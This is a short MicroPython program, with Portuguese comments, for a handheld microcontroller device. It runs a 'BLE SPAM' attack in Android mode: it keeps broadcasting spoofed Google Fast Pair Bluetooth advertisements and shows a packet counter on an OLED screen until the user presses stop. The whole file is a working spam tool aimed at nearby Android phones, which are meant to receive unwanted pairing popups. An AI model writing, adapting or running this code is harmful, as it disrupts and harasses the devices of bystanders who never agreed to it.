import ubluetooth
import struct
import time

def _montar_advertising_android():
    # Service Data com Fast Pair UUID (0xFE2C)
    # Nota: Model ID generico - popup completo requer registro oficial no Google
    model_id = bytes([0x00, 0x00, 0x00])  # 24 bits genericos

    payload = struct.pack("<H", 0xFE2C)  # UUID little-endian
    payload += model_id

    return struct.pack("BB", len(payload) + 1, 0x16) + payload  # 0x16 = Service Data

def executar_ble_spam_android(oled, btn_select):
    ble = ubluetooth.BLE()
    ble.active(True)

    # Aguarda botao ser solto antes de comecar
    while btn_select.value() == 0:
        time.sleep(0.05)
    time.sleep(0.2)

    contador = 0
    adv_data = _montar_advertising_android()

    while True:
        if btn_select.value() == 0:
            while btn_select.value() == 0:
                time.sleep(0.05)
            time.sleep(0.2)
            break

        try:
            ble.gap_advertise(100, adv_data)
        except:
            pass

        contador += 1

        oled.fill(0)
        oled.text("BLE SPAM", 30, 0)
        oled.hline(0, 10, 128, 1)
        oled.text("Android Mode", 18, 20)
        oled.text("Pacotes:", 10, 36)
        oled.text(str(contador), 90, 36)
        oled.text("[select] parar", 4, 54)
        oled.show()

        time.sleep(0.3)

    ble.gap_advertise(None)
    ble.active(False)